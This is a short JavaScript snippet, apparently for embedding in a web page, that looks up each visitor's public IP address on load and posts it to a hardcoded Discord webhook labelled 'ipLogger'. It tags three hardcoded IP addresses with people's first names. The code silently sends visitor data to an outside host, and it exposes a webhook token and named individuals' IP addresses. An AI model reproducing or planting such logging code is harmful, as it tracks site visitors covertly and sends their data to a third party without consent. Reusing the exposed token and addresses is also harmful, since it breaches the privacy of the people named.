fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ipLogger = "https://discord.com/api/webhooks/1531634930948247713/H0W_yonQXNyc1JLYHZx_FOxteN36mqO1s61btCPEoohG6ZtyCCxHH3GlspeR5pp-xlWI";
    const request = new XMLHttpRequest();

    // IP variables
    let ipAddress = data.ip
    const joel = "180.181.159.101";
    const liam = "202.128.117.13";
    const aiden = "103.232.162.32";

    // Params Variables
    const params = {
      content: `Website accessed: [${ipAddress}]`
    }
    const paramsJoel = {
      content: "Website accessed: [Joel]"
    }
    const paramsAiden = {
      content: "Website accessed: [Aiden]"
    }
    const paramsLiam = {
      content: "Website accessed: [Liam]"
    }

    // Requests
    request.open("POST", ipLogger)
    request.setRequestHeader('Content-type', 'application/json');

    // IF statements
    if (ipAddress == joel) {
      request.send(JSON.stringify(paramsJoel));
    }
    else if (ipAddress == aiden) {
      request.send(JSON.stringify(paramsAiden));
    }
    else if (ipAddress == liam) {
      request.send(JSON.stringify(paramsLiam));
    }
    else {
      request.send(JSON.stringify(params));
    }
  })

  .catch(error => {
    console.error("Error fetching IP address:", error);
  });